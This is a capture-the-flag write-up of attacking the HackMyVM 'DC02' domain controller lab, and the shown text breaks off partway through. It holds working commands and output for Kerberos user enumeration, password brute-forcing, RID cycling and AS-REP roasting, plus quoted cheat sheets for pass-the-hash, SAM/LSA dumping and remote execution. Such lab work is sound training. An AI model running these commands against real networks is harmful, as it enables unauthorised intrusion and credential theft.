# CTF Penetration Testing

## HackMyVM

### DC02 - Machine

- Machine name: [DC02](https://hackmyvm.eu/machines/machine.php?vm=DC02)
- Machine type: Windows VM <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/dc02.png" alt="DC02 Machine Logo" width="150"/>

#### Tools Used

- crackmapexec
- evil-winrm
- impacket-GetNPUsers
- impacket-lookupsid
- impacket-reg
- impacket-secretsdump
- impacket-smbserver
- kerbrute
- ldapsearch
- Nmap

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:35:ea:1e:2d  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 3  bytes 1770 (1.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13  bytes 2203 (2.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.102  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::b8a4:ba37:17c5:3d73  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:6e:4c:1d  txqueuelen 1000  (Ethernet)
        RX packets 42  bytes 8076 (7.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 27  bytes 4180 (4.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.102
192.168.56.103 ←
```

`nmap -Pn -sS -sV -p- -T4 192.168.56.103`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 10:44 EDT
Nmap scan report for 192.168.56.103
Host is up (0.00064s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-03 23:46:37Z) ←
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn ←
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name) ←
445/tcp   open  microsoft-ds? ←
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:A2:2A:A6 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.50 seconds
```

`nmap -Pn -sS --script=smb-protocols -p445 192.168.56.103`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 10:45 EDT
Nmap scan report for 192.168.56.103
Host is up (0.0014s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:A2:2A:A6 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-protocols: ←
|   dialects:
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

`nmap -Pn -sS --script=smb2-security-mode -p445 192.168.56.103`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 10:45 EDT
Nmap scan report for 192.168.56.103
Host is up (0.0045s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:A2:2A:A6 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required ←

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

<🔄 Alternative Step>

`crackmapexec smb 192.168.56.103`:
```
SMB         192.168.56.103  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) ←
```

</🔄 Alternative Step>

`echo -e '192.168.56.103\tDC01.SOUPEDECODE.LOCAL' | tee -a /etc/hosts`:
```
192.168.56.103  DC01.SOUPEDECODE.LOCAL ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[139,445 - Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

[**#Possible Credentials**]

|   |   |
|---|---|
|**Username(s)**|**Common passwords**|
|_(blank)_|_(blank)_|
|guest|_(blank)_|
|Administrator, admin|_(blank)_, password, administrator, admin|
|arcserve|arcserve, backup|
|tivoli, tmersrvd|tivoli, tmersrvd, admin|
|backupexec, backup|backupexec, backup, arcada|
|test, lab, demo|password, test, lab, demo|

[**#Obtain Information**]

```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password
```

[**#List shared folders**]

It is always recommended to look if you can access to anything, if you don't have credentials try using **null** **credentials/guest user**.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`smbclient --no-pass -L 192.168.56.103`:
```
session setup failed: NT_STATUS_ACCESS_DENIED ←
```

`nmap -Pn -sS --script=ldap-rootdse -p389 192.168.56.103`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 10:49 EDT
Nmap scan report for 192.168.56.103
Host is up (0.00055s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL ←
|       ldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=SOUPEDECODE,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=SOUPEDECODE,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 53270
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
|       dnsHostName: DC01.SOUPEDECODE.LOCAL
|       defaultNamingContext: DC=SOUPEDECODE,DC=LOCAL
|       currentTime: 20240903234949.0Z
|_      configurationNamingContext: CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
MAC Address: 08:00:27:A2:2A:A6 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)

[**#User enumeration**]

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb) and [**pentesting LDAP**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cat /usr/share/wordlists/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt| tr '[:upper:]' '[:lower:]' | sort -u > ./xato_usernames_lowercase.txt`

`kerbrute userenum --dc 192.168.56.103 -d 'SOUPEDECODE.LOCAL' ./xato_usernames_lowercase.txt`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/03/24 - Ronnie Flathers @ropnop

2024/09/03 11:23:26 >  Using KDC(s):
2024/09/03 11:23:26 >   192.168.56.103:88

2024/09/03 11:25:14 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2024/09/03 11:25:14 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2024/09/03 11:32:33 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL ←
2024/09/03 11:34:53 >  [+] VALID USERNAME:       dc01@SOUPEDECODE.LOCAL

[...]
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Active Directory Methodology | Password Spraying / Brute Force](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying)

[**#Exploitation from Linux (or all)**]

- Using **crackmapexec**:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go):
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`kerbrute bruteuser --dc 192.168.56.103 -d 'SOUPEDECODE.LOCAL' /usr/share/wordlists/rockyou.txt 'charlie'`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/03/24 - Ronnie Flathers @ropnop

2024/09/03 11:38:05 >  Using KDC(s):
2024/09/03 11:38:05 >   192.168.56.103:88

2024/09/03 11:38:06 >  [+] VALID LOGIN WITH ERROR:       charlie@SOUPEDECODE.LOCAL:charlie   (Clock skew is too great)  ←                                                                  
2024/09/03 11:38:06 >  Done! Tested 75 logins (1 successes) in 1.118 seconds
```

`crackmapexec smb 192.168.56.103 -d 'SOUPEDECODE.LOCAL' -u 'charlie' -p 'charlie' --shares`:
```
SMB         192.168.56.103  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.103  445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         192.168.56.103  445    DC01             [+] Enumerated shares
SMB         192.168.56.103  445    DC01             Share           Permissions     Remark
SMB         192.168.56.103  445    DC01             -----           -----------     ------
SMB         192.168.56.103  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.103  445    DC01             C$                              Default share ←
SMB         192.168.56.103  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.103  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.103  445    DC01             SYSVOL          READ            Logon server share 
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>
[139,445 - Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

[**#Enumerate Users, Groups & Logged On Users**]

This info should already being gathered from enum4linux and enum4linux-ng
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```

[**#Execute Commands**]

crackmapexec can execute commands **abusing** any of **mmcexec, smbexec, atexec, wmiexec** being **wmiexec** the **default** method. You can indicate which option you prefer to use with the parameter `--exec-method`:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`crackmapexec smb 192.168.56.103 -d 'SOUPEDECODE.LOCAL' -u 'charlie' -p 'charlie' --rid-brute | tee ./out.txt`:
```
SMB         192.168.56.103  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.103  445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         192.168.56.103  445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.56.103  445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB         192.168.56.103  445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB         192.168.56.103  445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB         192.168.56.103  445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB         192.168.56.103  445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB         192.168.56.103  445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
SMB         192.168.56.103  445    DC01             515: SOUPEDECODE\Domain Computers (SidTypeGroup)
SMB         192.168.56.103  445    DC01             516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
SMB         192.168.56.103  445    DC01             517: SOUPEDECODE\Cert Publishers (SidTypeAlias)

[...]

SMB         192.168.56.103  445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB         192.168.56.103  445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
SMB         192.168.56.103  445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.56.103  445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
SMB         192.168.56.103  445    DC01             1104: SOUPEDECODE\otara1 (SidTypeUser)
SMB         192.168.56.103  445    DC01             1105: SOUPEDECODE\kleo2 (SidTypeUser)
SMB         192.168.56.103  445    DC01             1106: SOUPEDECODE\eyara3 (SidTypeUser)

[...]
```

<div>
	<img src="./assets/logo_exploit-notes.png" alt="Exploit Notes Logo" width="16" height="auto">
	<span style="#963bc2: white; font-size: 110%;"><strong>Exploit Notes</strong></span>
</div>

[SMB (Server Message Block) Pentesting](https://exploit-notes.hdks.org/exploit/windows/active-directory/smb-pentesting/)

[**#RID Cycling Attack**]

RID enumeration.  
It attempts to enumerate user accounts through null sessions.
```sh
# Anonymous logon
# 20000: Maximum RID to be cycled
impacket-lookupsid example.local/anonymous@<target-ip> 20000 -no-pass
impacket-lookupsid example.local/guest@<target-ip> 20000 -no-pass
impacket-lookupsid example.local/guest@<target-ip> 20000
# Specify user
impacket-lookupsid example.local/user@<target-ip> 20000 -hashes <lmhash>:<nthash>
impacket-lookupsid example.local/user@<target-ip> 20000


# USEFUL COMMAND
# This command extract usernames. It's useful for further enumeration which uses usernames.
# Replace the following keywords:
#  - `example.com` => Target domain
#  - `10.0.0.1`    => Target IP
#  - `DOMAIN`      => Target domain name
impacket-lookupsid example.com/guest@10.0.0.1 20000 -no-pass > tmp.txt | cat tmp.txt | grep SidTypeUser | cut -d ' ' -f 2 | sed 's/DOMAIN\\//g' | sort -u > users.txt && rm tmp.txt
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<🔄 Alternative Step>

`impacket-lookupsid 'SOUPEDECODE.LOCAL/charlie:charlie@192.168.56.103'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 192.168.56.103
[*] StringBinding ncacn_np:192.168.56.103[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
513: SOUPEDECODE\Domain Users (SidTypeGroup)
514: SOUPEDECODE\Domain Guests (SidTypeGroup)
515: SOUPEDECODE\Domain Computers (SidTypeGroup)
516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
518: SOUPEDECODE\Schema Admins (SidTypeGroup)
519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
525: SOUPEDECODE\Protected Users (SidTypeGroup)
526: SOUPEDECODE\Key Admins (SidTypeGroup)
527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
1000: SOUPEDECODE\DC01$ (SidTypeUser)
1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
1103: SOUPEDECODE\bmark0 (SidTypeUser)
1104: SOUPEDECODE\otara1 (SidTypeUser)
1105: SOUPEDECODE\kleo2 (SidTypeUser)
1106: SOUPEDECODE\eyara3 (SidTypeUser)

[...]
```

</🔄 Alternative Step>

`impacket-lookupsid 'SOUPEDECODE.LOCAL/charlie:charlie@192.168.56.103' > ./out.txt`

`cat ./out.txt | grep -e "SidTypeUser" > ./out2.txt`

`cat ./out2.txt | awk '{print $2}' > ./out3.txt`

`cat ./out3.txt | cut -d '\' -f2 | cut -d ' ' -f1 | tee ./domain_users.txt`:
```
Administrator
krbtgt
bmark0
otara1
kleo2
eyara3
pquinn4
jharper5
bxenia6
gmona7
oaaron8
pleo9
evictor10
wreed11
bgavin12
ndelia13
akevin14
kxenia15
ycody16

[...]
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Active Directory Methodology | ASREPRoast](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)

[**#Request AS_REP message**]

Using Linux:
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

Using Windows:
```shell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`impacket-GetNPUsers -usersfile ./domain_users.txt -dc-ip 192.168.56.103 'SOUPEDECODE.LOCAL/charlie:charlie'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User bmark0 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User otara1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kleo2 doesn't have UF_DONT_REQUIRE_PREAUTH set

[...]

[-] User caiden36 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User xbella37 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smark38 doesn't have UF_DONT_REQUIRE_PREAUTH set
